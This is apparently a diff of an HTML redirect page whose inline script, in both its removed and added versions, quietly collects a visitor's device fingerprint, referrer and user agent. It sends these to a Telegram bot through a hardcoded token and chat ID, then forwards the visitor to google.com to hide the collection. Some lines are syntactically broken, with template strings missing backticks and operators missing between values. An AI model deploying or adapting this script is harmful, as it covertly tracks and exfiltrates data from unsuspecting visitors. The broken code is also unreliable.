@@ -11,68 +11,46 @@
         const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
         const CHAT_ID = "8814781494";
 
-        async function gatherInfo() {
-            // Базовые метрики экрана
-            const screenInfo = ${window.screen.width}x${window.screen.height} (Цветов: ${window.screen.colorDepth}, Пикселей: ${window.screen.pixelDepth});
-            const windowInfo = ${window.innerWidth}x${window.innerHeight};
-
-            // Сеть (если поддерживается)
-            let connectionInfo = "недоступно";
-            if (navigator.connection) {
-                connectionInfo = Тип: ${navigator.connection.effectiveType || 'н/д'}, Скорость: ${navigator.connection.downlink || 'н/д'} Мбит/с, RTT: ${navigator.connection.rtt || 'н/д'}ms;
-            }
-
-            // Данные батареи (если поддерживается)
-            let batteryInfo = "недоступно";
-            if (navigator.getBattery) {
-                try {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = ${Math.round(battery.level * 100)}% (${battery.charging ? 'заряжается' : 'разряжается'});
-                } catch (e) {}
-            }
-
-            // Поддерживаемые языки
-            const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
-
-            // Часовой пояс
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";
-
-            // Доступная память и процессор
-            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
-            const cores = navigator.hardwareConcurrency || "неизвестно";
-
-            // Оценка железа по производительности задержки кадров (примерная)
-            const touchPoints = navigator.maxTouchPoints || 0;
-
-            const info = "🚨 Подробный отчет о посетителе\n\n" +
-                         "⏱ Время: " + new Date().toLocaleString() + "\n" +
-                         "🌍 Часовой пояс: " + timezone + "\n" +
-                         "💻 Платформа / ОС: " + navigator.platform + "\n" +
-                         "🗣 Языки: " + languages + "\n" +
-                         "📺 Экран (физ.): " + screenInfo + "\n" +
-                         "🪟 Окно браузера: " + windowInfo + "\n" +
-                         "👆 Точки касания (Тач): " + touchPoints + "\n" +
-                         "🧠 Память (RAM): " + ram + "\n" +
-                         "⚙️ Ядра процессора: " + cores + "\n" +
-                         "📶 Сеть: " + connectionInfo + "\n" +
-                         "🔋 Батарея: " + batteryInfo + "\n" +
-                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
-                         "📌 Текущий адрес: " + window.location.href + "\n" +
-                         "📱 User-Agent: " + navigator.userAgent;
-
-            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";
-
-            // Отправляем в фоне
-            fetch(url).catch(function() {});
+        // Собираем всю доступную информацию синхронно
+        const screenInfo = window.screen.width + "x" + window.screen.height + " (Цветов: " + window.screen.colorDepth + ")";
+        const windowInfo = window.innerWidth + "x" + window.innerHeight;
+        
+        let connectionInfo = "недоступно";
+        if (navigator.connection) {
+            connectionInfo = "Тип: " + (navigator.connection.effectiveType  'н/д') + ", Скорость: " + (navigator.connection.downlink  'н/д') + " Мбит/с";
         }
 
-        // Запускаем сбор и сразу ставим таймер на редирект (0.6 сек), 
-        // чтобы асинхронные запросы (например, батарея) успели выполниться в фоне, но юзер не ждал долго.
-        gatherInfo();
+        const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
+        const cores = navigator.hardwareConcurrency || "неизвестно";
+        const touchPoints = navigator.maxTouchPoints || 0;
 
-        setTimeout(function() {
-            window.location.href = "https://google.com";
-        }, 600);
+        // Обычный текст без Markdown, чтобы Telegram не отклонял запросы со спецсимволами
+        const info = "🚨 Подробный отчет о посетителе\n\n" +
+                     "⏱ Время: " + new Date().toLocaleString() + "\n" +
+                     "🌍 Часовой пояс: " + timezone + "\n" +
+                     "💻 Платформа: " + navigator.platform + "\n" +
+                     "🗣 Языки: " + languages + "\n" +
+                     "📺 Экран: " + screenInfo + "\n" +
+                     "🪟 Окно: " + windowInfo + "\n" +
+                     "👆 Тач-точки: " + touchPoints + "\n" +
+                     "🧠 Память (RAM): " + ram + "\n" +
+                     "⚙️ Ядра CPU: " + cores + "\n" +
+                     "📶 Сеть: " + connectionInfo + "\n" +
+                     "🔗 Источник: " + (document.referrer || "прямой заход") + "\n" +
+                     "📌 Адрес: " + window.location.href + "\n" +
+                     "📱 User-Agent: " + navigator.userAgent;
+
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);
+
+        // Отправляем запрос и гарантированно перенаправляем после его завершения
+        fetch(url)
+            .finally(function() {
+                setTimeout(function() {
+                    window.location.href = "https://google.com";
+                }, 500);
+            });
     </script>
 </body>
 </html>
